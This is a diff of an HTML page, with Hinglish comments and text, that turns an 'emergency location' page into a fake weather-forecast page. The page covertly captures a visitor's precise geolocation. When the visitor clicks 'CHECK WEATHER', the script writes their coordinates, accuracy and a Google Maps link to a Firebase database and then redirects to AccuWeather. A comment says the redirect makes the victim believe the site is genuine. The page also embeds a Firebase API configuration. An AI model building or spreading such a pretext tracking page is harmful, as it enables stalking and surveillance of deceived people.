@@ -3,27 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emergency Location Access</title>
+    <title>Live Weather & Local Forecast</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f8f9fa; }
-        .btn { background-color: #d9534f; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
-        .status { margin-top: 20px; color: #555; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 40px;
+            background: linear-gradient(to right top, #65dfc9, #6cdbeb); /* Nice gradient background */
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            color: #333;
+        }
+        .weather-card {
+            background: white;
+            padding: 40px;
+            border-radius: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            max-width: 450px;
+            width: 90%;
+            margin: auto;
+            animation: fadeIn 1s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .weather-icon {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #2c3e50;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .btn {
+            background-color: #ff7e5f; /* Coral color */
+            color: white;
+            padding: 16px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 19px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            width: 80%;
+            max-width: 300px;
+        }
+        .btn:hover {
+            background-color: #feb47b; /* Lighter coral */
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+        }
+        #status {
+            margin-top: 25px;
+            font-weight: bold;
+            color: #333;
+            min-height: 20px; /* Space for messages */
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #888;
+        }
     </style>
 </head>
 <body>
 
-    <h1>Emergency Assistance</h1>
-    <p>Location share karne ke liye niche button dabayein.</p>
-    
-    <button class="btn" onclick="sendLocation()">SHARE MY LOCATION</button>
-    <div id="status" class="status"></div>
+    <div class="weather-card">
+        <img src="https://openweathermap.org/img/wn/03d@2x.png" alt="Weather Icon" class="weather-icon">
+        <h1>Apne Area Ka Live Mausam Jaanein</h1>
+        <p>Apni location check karne ke liye niche diye gaye button par click karein aur apne shehar ka sabse sahi mausam ka purvanuman payein.</p>
+        
+        <button class="btn" onclick="checkWeather()">CHECK WEATHER</button>
+        <div id="status"></div>
+
+        <div class="footer">
+            *Yeh service aapki location ka upyog karke sateek mausam jankari deti hai.
+        </div>
+    </div>
 
     <script>
-        // Aapka provide kiya gaya Firebase Config
+        // Aapka Firebase Config - Isse na badlein
         const firebaseConfig = {
             apiKey: "AIzaSyC0SBFtrhGPMI3tiBJPSePBRrjR0gUpm0Q",
             authDomain: "loac-fb920.firebaseapp.com",
@@ -34,40 +109,67 @@
             appId: "1:1019799005125:web:889ced5ba3330ddc944dac"
         };
 
-        // Firebase ko initialize karein
+        // Firebase Initialize
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        function sendLocation() {
-            const status = document.getElementById('status');
-            status.innerText = "Location access maangi ja rahi hai...";
+        // High Accuracy Options
+        const locationOptions = {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        };
+
+        function checkWeather() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = "Mausam ki jankari ke liye location access maangi ja rahi hai...";
+            statusDiv.style.color = "#555";
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-
-                    // Database mein data bhej rahe hain
-                    database.ref('emergency_requests/').push({
-                        latitude: lat,
-                        longitude: lon,
-                        timestamp: new Date().toLocaleString(),
-                        mapLink: `https://www.google.com/maps?q=${lat},${lon}`
-                    }).then(() => {
-                        status.innerText = "Success! Location bhej di gayi hai.";
-                        alert("Aapki location Admin tak pahunch gayi hai.");
-                    }).catch((error) => {
-                        status.innerText = "Error: " + error.message;
-                    });
-
-                }, (error) => {
-                    status.innerText = "Permission Denied! Bina iske kaam nahi chalega.";
-                }, { enableHighAccuracy: true });
+                navigator.geolocation.getCurrentPosition(successWeather, errorWeather, locationOptions);
             } else {
-                status.innerText = "Aapka browser support nahi karta.";
+                statusDiv.innerHTML = "Error: Aapka browser location support nahi karta.";
+                statusDiv.style.color = "red";
+            }
+        }
+
+        function successWeather(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            // Firebase mein data save karna
+            database.ref('weather_location_data/').push({
+                latitude: lat,
+                longitude: lon,
+                accuracy_meters: acc,
+                timestamp: new Date().toLocaleString(),
+                google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`
+            }).then(() => {
+                const statusDiv = document.getElementById('status');
+                statusDiv.innerHTML = "Mausam ki jankari mil gayi hai. Aapko redirect kiya ja raha hai...";
+                statusDiv.style.color = "green";
+                
+                // User ko lagega ki woh asli weather site par ja raha hai
+                setTimeout(() => {
+                    window.location.href = "https://www.accuweather.com/"; // Aap koi bhi weather site yahan daal sakte hain
+                }, 1500); // 1.5 second ke baad redirect karega
+            }).catch(error => {
+                const statusDiv = document.getElementById('status');
+                statusDiv.innerHTML = "Error: Data Firebase mein save nahi ho paya. " + error.message;
+                statusDiv.style.color = "red";
+            });
+        }
+
+        function errorWeather(err) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.color = "red";
+            if (err.code === 1) {
+                statusDiv.innerHTML = "Error: Aapne location permission deny kar di hai. Mausam nahi dikh payega.";
+            } else {
+                statusDiv.innerHTML = "Error: Location nahi mil pa rahi. Kripya thodi der baad dobara prayas karein.";
             }
         }
     </script>
 </body>
-
 </html>
